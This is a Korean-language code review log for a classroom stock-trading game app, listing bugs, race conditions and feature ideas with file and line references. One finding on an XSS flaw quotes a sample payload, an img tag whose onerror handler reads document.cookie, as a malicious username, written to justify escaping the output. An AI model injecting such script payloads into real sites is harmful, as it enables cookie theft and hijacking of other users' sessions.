- **`force_price()` / `force_sector_event()` 후 `_prev` 미갱신으로 강제 이벤트 직후 등락률 왜곡** (`stock_service.py:268-269`): `self._prev` 딕셔너리는 `_init_prices()`에서 초기화된 뒤 전혀 갱신되지 않음. 교사가 `-30%` 섹터 이벤트를 적용해도 `get_prev_close()`는 이벤트 이전 가격을 반환하므로, `get_stocks()` 응답의 `change_pct`가 게임 시작가 대비 누적 등락률로 표시됨. `force_price()` (line 232) 마지막과 `force_sector_event()` 루프 내부(line 244 직후)에 `self._prev[sym] = new_price`를 추가하면 이벤트 직후 시장 카드에 정확한 이벤트 기준 등락률이 보여 학생이 변화를 즉각 인식 가능.

- **개인 투자 성과 요약 리포트** (`app.py:622-640`, `models.py:65-76`): 결과 화면에는 최종 자산·수익률만 표시. `GET /api/rooms/<rid>/my-report` 엔드포인트를 추가해 `{best_stock, worst_stock, total_trades, most_traded_sector, quiz_count}`를 `RoomTransaction` 집계로 반환하면 결과 화면에 "내 투자 리포트" 카드로 표시 가능. 신규 모델 변경 없이 기존 테이블만으로 구현되며, 게임 종료 후 교사의 "왜 이 종목을 선택했나요?" 토론에 데이터 근거를 제공해 교육 효과 향상.

- **룰렛 `✕` 버튼이 스핀 애니메이션 중 동작해 결과 미표시** (`app.js:1002-1009`, `index.html:507`): d5c8e6d 커밋으로 추가된 `✕` 버튼이 `closeRoulette()`를 호출하는데, `doRouletteSpin()` 내 `await new Promise(r => setTimeout(r, 4300))` 대기 중에도 오버레이가 닫혀 4초 후 결과를 DOM에 기록해도 화면에 표시되지 않고 토스트만 남음. 2026-06-14 4차에서 오버레이 배경 탭 클릭 경로를 지적했으나 신규 버튼으로 같은 문제가 재발. `closeRoulette()` 첫 줄에 `if (_rltSpinning) return;` 한 줄만 추가하면 방지 가능.

- **복권 번호 무제한 재제출로 마감 직전 번호 변경 가능** (`app.py:902-903`): `lottery_pick()`에서 `cur['picks'][str(user.id)] = nums`가 항상 최신 제출로 덮어씀. 제출 후 번호를 계속 바꿔 유리한 번호를 선택할 수 있어 공정성 훼손. `if str(user.id) in cur['picks']: return jsonify({'ok': True, 'picks': cur['picks'][str(user.id)]})` 패턴으로 초기 제출 고정. 또는 프론트에서 제출 후 `_lotPickerSubmitted = true`로 설정해 버튼을 즉시 비활성화하면(로직 이미 있음, `app.js:2049` 근방) 재제출 방지.

- **`openRules()` 탭 상태 미초기화로 재오픈 시 이전 탭 잔류** (`app.js:2128-2135`): `openRules()`는 `openModal('modal-rules')`만 호출하고 탭 초기화를 하지 않음. 학생이 "복권" 탭을 보고 닫은 뒤 다시 열면 "기본 규칙" 대신 "복권" 탭이 기본 표시됨. `openRules()` 내부에 `document.querySelector('.rules-tab').click()` 또는 `switchRulesTab('basic', document.querySelector('.rules-tab'))` 한 줄을 추가하면 항상 첫 번째 탭으로 초기화되어 일관된 UX 제공.

---

### 제거/단순화할 것들

- **`get_price()` 내 차트 캐시 무효화가 `HISTORY_CACHE_TTL` 완전 무력화** (`stock_service.py:176-179`): 가격 TTL(기본 20초) 만료 시 해당 종목의 차트 캐시를 삭제해 `HISTORY_CACHE_TTL = 120`의 의도가 완전히 무력화됨. 모달을 닫고 21초 후 다시 열면 항상 다른 차트가 표시되어 2026-06-10에 지적한 "캐싱으로 일관된 차트 제공" 목표를 달성할 수 없음. `stock_service.py:176-179`의 `del self._history_cache[key]` 루프를 제거하면 됨. 강제 가격 조정 시 캐시 무효화는 `force_price()` (line 217-219)와 `force_sector_event()` (line 247-249)에 이미 구현되어 있으므로 충분.

- **`minigame_close()` / `_do_reveal()` deprecated `Room.query.get()` 사용** (`app.py:114`, `app.py:763`): 두 함수가 `Room.query.get(rid)` (SQLAlchemy 2.x 폐기 API)를 사용해 다른 라우트의 `Room.query.get_or_404(rid)` 패턴과도 불일치. `minigame_close()`에서는 `room`이 None이면 `.status` 접근 시 `AttributeError`가 발생할 수 있고, `_do_reveal()`에서도 동일 위험. `db.session.get(Room, rid)` + `if not room: return` 명시적 None 체크로 교체하면 안전성·일관성 동시 확보.

- **`get_history()` `interval` 파라미터가 함수 본문에서 완전히 무시됨** (`stock_service.py:271`, `app.py:511`): `get_history(symbol, period, interval)` 서명에 `interval`이 있지만 함수 내부에서 전혀 사용되지 않음. `app.py:511`에서 `'5m'`, `'30m'`, `'1wk'` 등을 전달하나 모두 무시되어 기간에 상관없이 일봉 간격(86400초)으로 날짜를 계산. `interval_secs = {'5m': 300, '30m': 1800, '1d': 86400, '1wk': 604800}.get(interval, 86400)` 매핑을 `stock_service.py:283` 직전에 추가하고, line 287의 `i * 86400`을 `i * interval_secs`로 교체하면 기간에 맞는 봉 간격 표시 가능.

- **`_next_price()` 가격 상한(base×1.4)과 `force_price()` 허용 상한(base×3.0) 불일치로 강제 조정 즉시 소멸** (`stock_service.py:137`, `stock_service.py:215`): `force_price()`로 base×2.0까지 올려도 다음 TTL 만료 시 `_next_price()`가 `min(base*1.4, new_price)`로 즉시 클램핑. 교사의 극단적 가격 조정 효과가 한 틱(20초)만에 사라져 수업 시연 효과가 없음. 수정 방법 1: `force_price()` 호출 후 해당 종목의 타임스탬프를 `now + price_ttl * 2`로 연장해 2틱 동안 강제 가격 유지. 수정 방법 2: `stock_service.py:137`의 클램프 범위를 `base * 3.0`까지 확대해 `force_price()` 허용 범위와 일치시킴.

- **`export_rankings()` 함수 내부 `import openpyxl`** (`app.py:1081-1083`): `import openpyxl`, `from io import BytesIO`, `from openpyxl.styles import ...` 3줄이 라우트 함수 내부에 위치. `openpyxl` 미설치 환경에서 서버가 정상 시작되다가 교사가 엑셀 내보내기 버튼을 누를 때만 `ImportError`가 500 응답으로 반환됨. 모듈 상단으로 이동하면 서버 시작 시 즉시 오류 감지 가능. `BytesIO`는 표준 라이브러리이므로 영향 없으나 `openpyxl`은 외부 패키지 — `try: import openpyxl \nexcept ImportError: openpyxl = None` 패턴으로 서버 시작 로그에서 명시적 경고 표시 권장.

- **`_rlt_active` 카운터 비원자적 업데이트로 다중 일시정지 위험** (`app.py:738-746`): `state['count'] += 1` 직후 `state['count'] == 1` 체크까지 Lock이 없음. Flask 개발 서버(단일 스레드)에서는 무관하나 Gunicorn 멀티 워커나 eventlet 환경에서 두 학생이 동시에 룰렛을 열면 두 요청이 모두 `count == 1`로 평가해 `room.status = 'paused'` + `paused_at` 설정을 중복 실행 가능. 두 번째 `paused_at` 덮어쓰기로 이후 `resume_room()` 타이머 연장값이 틀어짐. `_room_services_lock`과 같은 방식으로 `_rlt_active_lock = Lock()`을 추가하고 `open` / `close` 핸들러에서 해당 방의 count·auto_paused 변경을 원자적으로 실행하는 것이 안전.

---

## 2026-06-17

### 추가하면 좋을 기능

- **룰렛 일시정지 영구 고착 방지 타임아웃** (`app.py:738-771`): 학생 브라우저가 룰렛 오버레이 열린 채로 비정상 종료되면 `_rlt_active[rid]['count']`가 1 이상으로 고착돼 `minigame_close`가 호출되지 않음 → 게임이 영구 일시정지 상태 유지. 교사가 수동 재개할 때까지 아무도 거래 불가. 해결책: `minigame_open` 호출 시 `threading.Timer(120, lambda: _force_resume(rid))` 같은 안전망 타이머를 등록하고, `minigame_close`에서 취소. 또는 `_rlt_active[rid]` 항목에 `opened_at` 타임스탬프를 기록하고, `get_room_status()` 폴링 응답에서 120초 초과 룰렛 세션을 자동 정리.

- **퀴즈 중복 출제 방지** (`app.py:968-982`): `get_quiz()` 라우트가 `random.choice(QUIZ_QUESTIONS)` 단순 랜덤을 사용해 60초 쿨다운 직후 동일 학생에게 같은 문제가 다시 출제될 수 있음. `_quiz_state[rid][uid]` 딕셔너리에 `'seen': set()` 필드를 추가하고, `seen`에 없는 문제 중에서만 선택하도록 수정. 전체 문제를 소진하면 `seen`을 초기화해 순환.

- **`host_adjust` 모달에 총 자산 표시** (`app.js:452-460`, `app.py:393`): 현재 교사가 학생 현금을 조정할 때 모달에 현금 잔액만 표시(`member.cash`). 주식을 많이 보유한 학생은 현금이 거의 없어도 총자산이 매우 크므로 현금 조정 효과가 미미함을 교사가 파악하기 어려움. `/api/rooms/<rid>/rankings` 응답의 `total` 값을 `host_adjust` 모달에 "총자산: ₩ X" 형태로 함께 표시하면 교사가 조정 필요 여부를 즉시 판단 가능.

- **`force_price()` `show_hint` 파라미터화** (`stock_service.py:208-232`): `force_price()` 내부에서 `'show_hint': True`가 하드코딩되어 있어 교사가 가격을 강제 조정하면 항상 방향 힌트가 뉴스로 노출됨. 교사가 조용히 가격만 조정하고 싶은 상황(예: 오류 수정)에 대응 불가. `force_price(symbol, pct, room_id, show_hint=True)` 형태로 파라미터를 추가하고, `/api/rooms/<rid>/force_price` 라우트(`app.py:488`)에서 `request.json.get('show_hint', True)`로 전달하면 선택적 힌트 공개 가능.

### 제거/단순화할 것들

- **`enter()` IntegrityError 미처리로 500 반환** (`app.py:208-219`): 두 클라이언트가 동시에 같은 username으로 `/api/auth/enter`를 요청하면 둘 다 `User.query.filter_by(username=...)` 조회에서 None을 얻고, 두 번째 `db.session.commit()`에서 `IntegrityError`가 발생해 클라이언트에게 500 HTML이 반환됨. `api.post()`는 JSON 파싱을 시도해 `SyntaxError`로 이어짐. `db.session.commit()` 직후 `except IntegrityError`를 추가하고 롤백 후 기존 사용자를 재조회하는 패턴으로 수정하면 동시 가입 시 안전.

- **`openStockModal()` 항상 `'1mo'` 차트로 초기화** (`app.js:1221-1224`): 사용자가 `'1wk'`로 기간을 바꿔 차트를 보다가 다른 종목을 클릭하면 `openStockModal()`이 `loadChart('1mo')`를 무조건 호출해 선택했던 기간 정보가 소멸. 전역 변수 `S.lastChartPeriod = '1mo'` (기본값)를 두고, 기간 버튼 클릭 시 업데이트, `openStockModal()`에서 `loadChart(S.lastChartPeriod)`로 호출하면 모달 간 기간 선택 상태 유지.

- **`goHome()` / `doLogout()` 복권 관련 상태 미초기화** (`app.js:96-100`, `app.js:557-559`): `_lotParticipantPicks`, `_lotPickerSubmitted`, `_lotResultRound`, `_lotPolling` 변수가 `enterParticipantGame()`에서만 초기화되고 `goHome()`·`doLogout()`에서는 초기화되지 않음. 학생이 복권 진행 중 홈으로 나갔다가 다른 방에 재입장하면 이전 복권 선택값과 제출 상태가 남아 있어 복권 화면이 오작동. `goHome()` 내부(line 96)에 `_stopLotPolling(); _lotParticipantPicks = []; _lotPickerSubmitted = false; _lotResultRound = null;` 4줄 추가로 해결.

- **`minigame_open` 중복 호출 시 count 이중 증가** (`app.py:738-746`): 학생 브라우저가 룰렛 오버레이 요청을 재시도(네트워크 지연·이중 탭)하면 동일 사용자가 `minigame_open`을 두 번 호출해 `state['count']`가 2 증가. 이후 `minigame_close` 한 번으로는 count가 1로 남아 게임 일시정지가 해제되지 않음. `_rlt_active[rid]` 에 `'openers': set()` 필드를 추가하고, `user_id`가 이미 `openers`에 있으면 count 증가를 건너뛰는 멱등성 처리가 필요.

- **`refreshMyRank()` 자산 히스토리 X축 레이블에 로컬 시계 사용** (`app.js:690-693`): 자산 추이 차트 X축 레이블을 `new Date()`(클라이언트 로컬 시각)로 생성해 자정 근처나 학생 기기 시계가 다를 때 그래프 시간 축이 어긋남. 서버 응답에 `server_time` 필드를 포함시키거나, `portfolio` API 응답의 `timestamp` 값을 기준으로 레이블을 계산하면 서버 기준 KST로 일관된 시간 표시 가능.

---

## 2026-06-17 (2차)

### 추가하면 좋을 기능

- **시장 탭 실시간 섹터 성과 요약 바** (`app.js:1097-1117`, `stock_service.py:99`): `loadMarket()` 성공 후 `S.stocks`를 섹터별로 그룹화해 평균 `change_pct`를 계산하고, 섹터 필터 버튼 위에 `"반도체 +1.2% | IT −0.5% | 배터리 +0.8%"` 형태의 한 줄 요약 바를 렌더링하면 학생이 종목 카드를 일일이 열지 않아도 강세/약세 섹터를 한눈에 파악 가능. `renderSectors()` 내부(`app.js:1111`)에 `const sectorAvg = ...` 계산 블록과 요약 텍스트 DOM 업데이트 10줄 추가로 서버 변경 없이 구현 완료.

- **진행자 실시간 게임 통계 카드** (`app.py:601-617`, `app.py:620-640`): `GET /api/rooms/<rid>/host/stats` 엔드포인트를 추가해 `{total_trades, total_volume, most_active_username, most_traded_symbol, quiz_correct_rate, roulette_spin_count}`를 `RoomTransaction` 집계 쿼리로 반환. 진행자 대시보드 "순위" 탭 하단에 "📊 게임 통계" 카드를 두고 10초마다 갱신하면 교사가 "지금까지 OOO건 거래, OO이 가장 많이 거래" 형태로 수업 개입 포인트를 실시간 파악 가능. 서버 30줄, 클라이언트 15줄 내 완성.

- **타이머 1분 전 모바일 진동 알림** (`app.js:710-716`): `startTimer()`의 `tick()` 함수에서 `rem === 60`이 처음 감지될 때 `navigator.vibrate?.([200, 100, 200])`을 호출하면, 스마트폰을 책상에 올려 둔 학생이 화면을 보지 않아도 진동으로 마감 1분 전을 인식 가능. `app.js:712` 직후 한 줄 추가로 구현되며 Web Vibration API 미지원 기기에서는 `?.`로 안전하게 무시됨. 동시에 `AudioContext.createOscillator()` 0.1초 비프음을 추가하면 소리 알림도 제공 가능 (볼륨 0.3 이하 권장).

- **종목 모달 보유 평가손익 배지** (`app.js:1195-1224`): `openStockModal()` 내 `port` 응답에서 이미 보유 종목의 `avg_price`를 알 수 있음. `h.avg_price`를 `S.tradeAvgPrice`로 저장하고, `ms-holding` 아래에 `<div id="ms-pnl">` 요소를 추가해 `((S.tradePrice - S.tradeAvgPrice) / S.tradeAvgPrice * 100).toFixed(2) + '%'`를 색상 있는 뱃지로 표시하면 학생이 모달을 열자마자 현재 포지션 수익률을 즉시 확인 가능. 포트폴리오 탭으로 이동하지 않아도 돼 매수/매도 결정 속도 향상. 서버 변경 없이 클라이언트 5줄 수정으로 구현 가능.

- **스마트 최대 매수 수량 실시간 힌트 레이블** (`app.js:1274-1277`): `updateTotal()` 함수가 이미 `trade-total`을 갱신하므로, 같은 함수 내에서 `Math.floor(S.tradeCash / S.tradePrice)`와 현재 입력값을 비교해 `"최대 N주 구매 가능"` 레이블을 수량 입력창 아래에 표시하면 학생이 잔액 대비 살 수 있는 최대 수량을 계산할 필요가 없어짐. `setMaxBuy()` 버튼(`app.js:1279`)은 이미 구현되어 있으나 버튼을 눌러야만 알 수 있는 반면, 실시간 힌트는 수량을 입력하면서 바로 확인 가능. API 호출 없이 `app.js:1276` 한 줄 추가로 구현 완료.

- **진행자 순위표에 학생별 활동 배지** (`app.js:383-395`, `app.py:344-354`): `host_members()` 응답에 `{trade_count, quiz_taken}` 필드를 추가(`RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id).count()`로 계산)하고, 진행자 순위 행에 `<span>💹 N건</span>` 거래 횟수 배지를 렌더링. 거래를 한 번도 안 한 학생(0건)에 `⚠` 아이콘을 표시하면 교사가 "OO 학생, 아직 거래를 시작 안 했네요" 식으로 개입 포인트를 즉시 파악 가능. 서버 5줄 + 클라이언트 3줄 수정.

---

### 제거/단순화할 것들

- **`enter()` 유효성 검사 메시지-코드 불일치** (`app.py:212-213`): `len(u) > 30`이면 400을 반환하지만 오류 메시지는 `"닉네임은 2~20자 사이여야 합니다."`로 20자라고 표기. 21~30자 닉네임을 입력한 사용자는 오류 없이 성공하는데 메시지에는 "20자 이하"가 맞다고 나와 혼란 유발. `len(u) > 20`으로 코드를 수정하거나 메시지를 `"2~30자 사이여야 합니다."`로 수정해 일관성 확보 필요.

- **`get_lottery()` 동시 폴링으로 `_do_reveal()` 중복 호출 위험** (`app.py:856-862`): 참여자 30명이 동시에 3초 폴링을 수행하면 `cur['state'] == 'drawing'` 조건이 여러 요청에서 동시에 참이 될 수 있음. `_do_reveal()` 내부에서 `cur['state'] = 'revealed'`를 설정하기 전에 두 번째 요청이 진입하면 `RoomMember.cash` 이중 지급이 발생. `_lots` 딕셔너리 수정이 Lock 없이 이루어지므로 Thread-safety 보장 불가. `cur['state'] = 'drawing'` 체크 직전에 `if cur.get('state') == 'drawing': cur['state'] = 'revealing'` 원자적 선점 처리를 추가하거나, `_lots` 전역 접근을 `threading.Lock()`으로 보호 권장 (`app.py:73` 근방에 `_lots_lock = Lock()` 추가).

- **`openRouletteModal()` 스핀 소진 시 무음 실패** (`app.js:897-920`): `if (data.error || data.spins_left <= 0) return;` 조건에서 `spins_left <= 0`이면 아무 피드백 없이 조용히 종료. 학생이 룰렛 버튼을 눌러도 화면에 아무 반응이 없어 앱이 멈춘 것으로 오해할 수 있음. `if (data.spins_left <= 0) { toast('룰렛 기회를 모두 사용했습니다.', 'info'); return; }` 한 줄로 사용자 피드백 제공. 마찬가지로 `data.error`가 있을 때도 현재는 토스트 없이 실패하므로 `toast(data.error, 'error');` 추가 권장.

- **`submit_quiz()` `bool(d.get('answer'))` 문자열 `'false'`를 `True`로 처리** (`app.py:994`): JSON body로 `{"answer": false}`를 정상 전송하면 `bool(False) = False`로 올바르나, API를 직접 curl로 호출하거나 클라이언트 버그로 `{"answer": "false"}`(문자열)가 전송되면 `bool("false") = True`가 되어 오답이 정답으로 처리됨. `user_answer = d.get('answer') is True` 또는 `if d.get('answer') not in (True, False): return jsonify({'error': '잘못된 답변'}), 400` 검증을 추가하면 타입 강제 변환 취약점 차단 가능.

- **`join_room()` 일시정지 상태 게임 중 신규 참여 허용** (`app.py:268`): `room.status == 'ended'`만 차단하므로 복권·룰렛으로 게임이 `'paused'` 상태일 때도 새 학생이 입장 가능. 복권 `drawing` 단계에서 입장한 학생은 `picks`가 없어 당첨 결과 0원을 받고, 갑자기 게임 화면으로 진입해 상황을 파악하지 못한 채 혼란 유발. `join_room()` 응답에 `'late_join': room.status in ('active', 'paused')`를 포함시키고, 클라이언트에서 `late_join`이 `true`이면 "게임이 이미 진행 중입니다 — 상황을 파악하고 거래를 시작하세요" 안내 토스트를 표시하는 것으로 최소한의 사용자 경험 보호 가능.

- **`loadParticipantRankings()` / `loadResults()` `e.username` XSS 취약점** (`app.js:1549`, `app.js:1614`): 순위 목록과 결과 화면에서 `e.username`을 template literal로 innerHTML에 직접 삽입. 사용자명에 `<img src=x onerror="alert(document.cookie)">` 또는 `<script>` 태그를 포함시켜 입장하면 다른 학생의 브라우저에서 임의 JS가 실행될 수 있음. `escHtml()` 함수가 `app.js:815`에 이미 정의되어 있으므로 `${e.username}` → `${escHtml(e.username)}`으로 교체하면 즉시 방지 가능. 진행자 화면의 `loadHostMembers()`(`app.js:383`)와 거래 내역의 `t.note`(`app.js:1449`)도 동일하게 escaping 필요.

- **`S.depositWarningShown` 방 변경 시 미초기화** (`app.js:12`, `app.js:96-100`): `S` 객체 초기화 시 `depositWarningShown: false`로 설정되지만, `goHome()`·`doLogout()`에서 `S.user = null; S.room = null`만 리셋하고 `S.depositWarningShown`은 초기화하지 않음. 학생이 첫 번째 게임에서 예금 만기 경고를 받은 후 홈으로 나갔다가 두 번째 게임에 예금을 하면, `checkDepositMaturity()` 첫 줄의 `if (S.depositWarningShown) return;` 가드(`app.js:638`)에 걸려 만기 임박 팝업이 절대 표시되지 않음. 2026-06-16에 지적한 `S.assetHistory` 미초기화와 동일한 패턴 — `showLanding()`(`app.js:82`) 또는 `stopPolling()` 내에서 `S.depositWarningShown = false;` 1줄 추가로 해결.

---

## 2026-06-18 (이전 분석 미수정 현황 점검)

### 여전히 미수정된 고우선순위 항목

- **`force_price()` / `force_sector_event()` ts 재사용** (`stock_service.py:216`, `stock_service.py:244`): 강제 가격 조정이 다음 TTL에 즉시 소멸. `(ts, new_price)` → `(time.time(), new_price)` 한 줄 수정. 06-13, 06-14 (3차), 06-15 (2차), 06-16 (3차)에 걸쳐 반복 지적됐으나 미수정.

- **`api.get/post/del` HTTP 오류 응답 미처리** (`app.js:30-34`): 서버 500 시 `SyntaxError`로 UI가 조용히 멈춤. 06-14, 06-16 (2차), 06-16 (3차)에 걸쳐 반복 지적됐으나 미수정.

- **`lobby_members()` 403 반환으로 참여자 로비 목록 항상 빈칸** (`app.py:465`): 06-12, 06-14 (4차)에 지적됐으나 미수정.

- **`loadParticipantRankings()` 매 호출마다 스피너로 목록 초기화 → 깜빡임** (`app.js:1543`): 06-14 (4차), 06-16 (3차)에 지적됐으나 미수정.

- **`submit_quiz()` room.status 체크 없음** (`app.py:1086`): 게임 종료 후에도 현금 변경 가능. 06-11, 06-15, 06-16 (3차), 06-17에 걸쳐 반복 지적됐으나 미수정.

- **`S.assetHistory`·`S.stocks` 방 전환 시 미초기화** (`app.js:89-100`): 06-16 (2차), 06-16 (3차)에 지적됐으나 미수정.

- **`export_rankings()` 함수 내부 `import openpyxl`** (`app.py:1180`): 06-14 (4차), 06-15 (2차), 06-16 (2차)에 지적됐으나 미수정.

- **`RLT_SEGS` dead code** (`app.js:820-826`): 06-14 (4차), 06-16, 06-16 (3차)에 지적됐으나 미수정.

---

## 2026-06-18

### 추가하면 좋을 기능

- **[버그] 게임 종료 후 최종 순위가 새 무작위 주가로 계산됨** (`app.py:48-69`, `app.py:35-46`): `_end_room()`이 `cleanup_room_service(room.id)`로 해당 방의 StockService를 삭제한 후, `GET /api/rooms/<rid>/rankings`나 엑셀 내보내기가 `member_total_value()`를 호출하면 `get_room_service(rid)`가 완전히 새로운 무작위 주가로 초기화된 StockService 인스턴스를 생성함. 결과적으로 **보유 주식 평가액이 게임 종료 시점 주가가 아닌 새 무작위 주가로 계산**되어 최종 순위표와 엑셀 다운로드 결과가 실제 게임 결과와 다를 수 있음. 수정 방법: `app.py:67`의 `cleanup_room_service(room.id)` 호출 직전에 모든 참여자의 `RoomHolding`을 현재 주가로 현금 전환(`m.cash += svc.get_price(h.symbol) * h.shares; h.shares = 0`)하고 `db.session.commit()`하면 종료 이후에도 정확한 자산 집계 가능.

- **복권 결과 진행자 모달에 참여자 이름 미표시** (`app.js:2062-2084`, `app.py:856-878`): `_showLotteryResult()` 호스트 분기의 결과 테이블이 `uid_str`(숫자 문자열)을 행 키로 나열하고 이름 없이 선택 번호와 당첨금만 표시. 교사가 "uid 7번이 3개 일치했다"는 숫자만 보이고 누가 당첨됐는지 알 수 없음. 서버 측 수정: `app.py:870-875`의 `_do_reveal()` 루프에서 `User` 이름을 `results[uid_str]['username']`에 포함. 클라이언트 측 대안: `loadHostMembers()` 응답을 `S.memberNameMap = {uid: username}` 형태로 저장해 두고 (`app.js:383` 직후), 복권 결과 렌더링 시 `S.memberNameMap[uid_str] || uid_str`로 참조하면 서버 변경 없이 해결.

- **퀴즈 창 강제 닫기로 쿨다운/패널티 우회 가능** (`app.py:968-982`, `app.js:810-812`): `closeQuiz()`가 `_quizTimerTick` 인터벌만 초기화하고 서버에 아무 요청을 보내지 않음. `_quiz_state[key]['cooldown_until']`이 0인 채로 유지되므로 학생이 어려운 문제를 보고 닫으면 즉시 다시 `openQuiz()`로 새 문제를 받을 수 있어 패널티 없이 유리한 문제만 선별 가능. `closeQuiz()` 호출 시 `quiz-result`가 아직 표시되지 않은 상태이면 `api.post('/api/rooms/.../quiz', {answer: false})`를 백그라운드에서 호출하거나, 클라이언트 측 `S.quizSkippedUntil = Date.now() + 60_000`을 설정하고 `openQuiz()` 첫 줄에서 잔여 쿨다운을 체크하는 방식으로 방지 (`app.js:812` 수정).

- **진행자가 게임 진행 중 참여자 강퇴 불가** (`app.py:360-367`): `kick_member()` 엔드포인트가 `if room.status != 'waiting': return 400`으로 대기 상태에서만 강퇴를 허용. 실제 수업에서는 게임 시작 후 부정한 방법으로 게임을 방해하거나 집중하지 않는 학생을 중간에 제거해야 하는 경우가 있음. `app.py:362` 조건을 `room.status == 'ended'`으로 변경(종료된 방만 차단)하거나, `active`/`paused` 상태에서는 `RoomMember` 레코드 삭제 대신 `is_active = False` 플래그로 처리하면 진행 중인 게임에서도 강퇴 가능. 강퇴 시 현재 자산을 결과에 포함할지 여부는 진행자가 선택할 수 있게 쿼리 파라미터로 처리 가능.

- **`_lots` 복권 상태 인메모리 저장으로 Render 재시작 시 소실** (`app.py:73`, `app.py:822-939`): `_quiz_state`·`_quiz_settings`·`_rlt_active`와 마찬가지로 `_lots` 딕셔너리도 서버 재시작 시 초기화됨. 복권 `'picking'` 단계(학생 60초 선택 시간)에서 Render dyno가 재시작되면 학생들이 제출한 번호가 전부 소실되고, 게임이 `'paused'` 상태(`auto_paused=True`)로 고착돼 교사가 수동 재개하기 전까지 아무도 거래 불가. 단기 해결책: `Room` 모델에 `lottery_state = db.Column(db.JSON, nullable=True)` 컬럼을 추가하고(`models.py:38` 직후), `_lots` 딕셔너리 변경 시 DB에도 직렬화해 저장하면 재시작 후에도 복권 상태 복원 가능.

---

### 제거/단순화할 것들

- **`join_room()` 동시 입장 시 `UniqueConstraint` → 500 반환** (`app.py:270-272`): 학생이 더블 클릭하거나 네트워크 재시도로 같은 방에 동시에 두 요청을 보내면, 두 요청 모두 `RoomMember.query.filter_by(...)` 조회에서 None을 얻고 두 번째 `db.session.commit()`에서 `UNIQUE constraint failed` → `IntegrityError` → 500 HTML이 반환됨. `api.post()`가 JSON 파싱을 시도해 `SyntaxError`로 이어져 조용히 실패. `db.session.add(m); db.session.commit()` 블록을 `try: ... except IntegrityError: db.session.rollback()` 으로 감싸면 두 번째 요청도 정상 응답 반환 가능 (`app.py:271-272` 수정).

- **`get_room()` 자동 종료가 `paused` 상태를 처리하지 않음** (`app.py:279-281`): `if room.status == 'active' and room.end_time and datetime.utcnow() >= room.end_time:` — 게임이 `'paused'`로 고착된 채 `end_time`을 초과해도 자동 종료가 실행되지 않음. 진행자가 일시정지 후 탭을 닫으면 해당 방이 `ended`가 되지 않아 교사가 새 방을 만들 수도 없는 상태가 됨(`app.py:250` 중복 방 체크에 걸림). `paused` 상태에서는 `end_time - paused_at <= timedelta(0)` 조건(남은 시간이 0 이하)을 추가해 자동 종료하거나, `room.status in ('active', 'paused')` 체크 후 경과 시간을 올바르게 계산해 `_end_room()`을 호출하도록 수정 (`app.py:279` 2줄 수정).

- **`host_members()` 내부 User 레코드 N번 개별 조회** (`app.py:344-346`): 진행자 순위 조회 시 `for m in RoomMember.query...` 루프 내에서 `db.session.get(User, m.user_id)`를 N번 호출. SQLAlchemy identity map 덕에 같은 요청 내 두 번째 조회는 캐시를 사용하지만, 10초 폴링마다 새로운 요청이 들어오면 매번 N번 DB 왕복 발생. `uids = [m.user_id for m in members]; user_map = {u.id: u for u in db.session.query(User).filter(User.id.in_(uids)).all()}` 패턴으로 1번 IN 쿼리로 교체하면 N번 → 1번으로 단축. `lobby_members()` (`app.py:374-378`)와 `host_member_transactions()` (`app.py:409-410`)도 동일 패턴.

- **방치된 `active`/`paused` 방이 교사의 새 방 생성을 영구 차단** (`app.py:250`, `app.py:186-192`): 서버 재시작·비정상 종료 등으로 `status='active'`이지만 실제로 아무도 없는 방이 DB에 남아 있으면, `create_room()` 의 `if Room.query.filter(Room.host_id == user.id, Room.status.in_(...)).first()` 체크에 걸려 교사가 새 방을 만들 수 없음. `end_time + timedelta(hours=2) < datetime.utcnow()` 조건의 방치된 방을 자동 정리하는 로직을 `create_room()` 체크 직전에 추가하거나, 진행자 화면에 "이전 방 강제 종료" 버튼을 노출하면 이 문제를 해소할 수 있음 (`app.py:249` 직전 추가).

- **`RoomTransaction.action` `String(4)` 타입과 복권 당첨 기록에 `'ADJ'` 혼용** (`models.py:71`, `app.py:165`): `action` 컬럼이 `String(4)`로 정의되어 향후 `'BONUS'`·`'FINE'` 등 긴 액션 타입 추가 시 DB truncation 위험. 더불어 복권 당첨금 `_do_reveal()` (`app.py:165`)이 `action='ADJ'`를 사용해 수동 자산 조정과 구분 불가 — `host_member_transactions`에서 복권 당첨과 교사 조정이 같은 "조정" 뱃지로 표시됨. `String(4)` → `String(10)` 확장과 함께 복권 당첨 기록 액션을 `action='LOTTO'`로 변경하면 거래 내역 필터링 및 통계 집계 시 두 유형을 명확히 구분 가능 (`app.py:165`, `app.py:908` 참조).

---

## 2026-06-18 (2차)

### 추가하면 좋을 기능

- **`get_portfolio()` 종료 후 새 StockService 인스턴스로 잘못된 평가액 반환** (`app.py:664`, `stock_service.py:308-311`): 06-18 1차에서 `export_rankings()`의 동일 버그를 지적했으나, `get_portfolio()`도 `get_room_service(rid)`를 호출해 동일한 문제가 발생함. 게임 종료 후 결과 화면에서 참여자가 포트폴리오 탭을 열면 CleanupService 이후 생성된 새 StockService의 무작위 주가로 보유 종목 평가액이 계산되어 결과 화면의 최종 자산과 포트폴리오 상세의 현재 평가액이 불일치함. `_end_room()` 직전에 보유 종목을 현금 전환하는 방식으로 `export_rankings()`와 함께 일괄 해결 가능.

- **`window.onload` 초기화 시 느린 네트워크에서 빈 화면 표시** (`app.js:2138-2158`): `window.addEventListener('load', async () => {...})` 내부에서 `await api.get('/api/auth/me')`를 완료하기 전까지 `showLanding()` 호출 없이 대기함. 학교 인트라넷 환경에서 응답이 2~3초 걸리면 학생이 흰 화면을 보며 앱이 죽었다고 오해할 수 있음. `api.get('/api/auth/me')` 호출 직전에 `showLanding()`을 먼저 호출해 기본 화면을 즉시 표시하고, 세션이 있으면 화면을 교체하는 방식으로 개선하면 체감 로딩 속도 향상.

- **퀴즈 시간 초과 시 자동으로 `answer: false` 제출 — 게임 종료 후에도 동작** (`app.js:781-784`, `app.py:1083-1113`): `_quizTimerTick` 내 `if (_quizTimeSec <= 0) { submitQuiz(null); }`가 게임 종료 이후에도 실행될 수 있음. 퀴즈를 열어 두고 게임이 종료된 후 타이머가 만료되면 `submit_quiz()` 서버에 POST 요청이 전송되고 (게임 종료 후 상태 체크 없어) `RoomMember.cash`가 변경됨. `closeQuiz()`를 `stopPolling()` 또는 `showScreen('screen-results')` 전환 시 함께 호출하면 방지 가능 (`app.js:580-584`에 `closeQuiz()` 한 줄 추가).

